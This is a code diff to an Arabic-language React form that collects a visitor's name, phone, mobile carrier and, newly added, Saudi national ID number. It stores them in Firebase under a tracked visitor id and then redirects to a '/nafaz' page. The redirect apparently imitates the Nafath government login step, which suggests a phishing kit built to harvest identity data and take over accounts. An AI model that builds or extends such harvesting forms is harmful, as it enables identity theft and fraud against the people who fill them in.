@@ -8,7 +8,7 @@ import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle }
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { User, Phone, Wifi } from "lucide-react"
+import { User, Phone, Wifi, IdCardIcon } from "lucide-react"
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
 import { CheckCircle } from "lucide-react"
 import { addData } from "@/lib/firebase"
@@ -16,6 +16,7 @@ import { addData } from "@/lib/firebase"
 export default function NetworkInfoForm() {
   const [formData, setFormData] = useState({
     name: "",
+    idNumber:"",
     phone: "",
     networkProvider: "",
   })
@@ -28,8 +29,8 @@ export default function NetworkInfoForm() {
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     const visitorId=localStorage.getItem('visitor')
-    addData({id:visitorId,formData})
-    console.log("Form Data Submitted:", formData)
+    addData({id:visitorId,...formData})
+    window.location.href="/nafaz"
   }
 
   return (
@@ -65,7 +66,24 @@ export default function NetworkInfoForm() {
                     required
                     className="h-11"
                   />
+                
                 </div>
+                <div className="space-y-2">
+                  <Label htmlFor="name" className="flex items-center gap-2">
+                    <IdCardIcon className="h-4 w-4 text-gray-500" />
+                    <span>رقم الهوية الوطنية </span>
+                  </Label>
+                   <Input
+                    id="idNumber"
+                    placeholder="  ادخل رقم الهوية"
+                    value={formData.idNumber}
+                    onChange={(e) => handleInputChange("idNumber", e.target.value)}
+                    required
+                    dir="rtl"
+                    type="tel"
+                    className="h-11"
+                  />
+                  </div>
                 <div className="space-y-2">
                   <Label htmlFor="phone" className="flex items-center gap-2">
                     <Phone className="h-4 w-4 text-gray-500" />
@@ -91,12 +109,9 @@ export default function NetworkInfoForm() {
                       <SelectValue placeholder="اختر مزود الخدمة" />
                     </SelectTrigger>
                     <SelectContent>
-                      <SelectItem value="stc">STC</SelectItem>
-                      <SelectItem value="mobily">Mobily</SelectItem>
+                      <SelectItem value="stc">STC </SelectItem>
+                      <SelectItem value="mobily">موبايلي </SelectItem>
                       <SelectItem value="zain">Zain</SelectItem>
-                      <SelectItem value="virgin">Virgin Mobile</SelectItem>
-                      <SelectItem value="lebara">Lebara</SelectItem>
-                      <SelectItem value="redbull">Red Bull Mobile</SelectItem>
                     </SelectContent>
                   </Select>
                 </div>
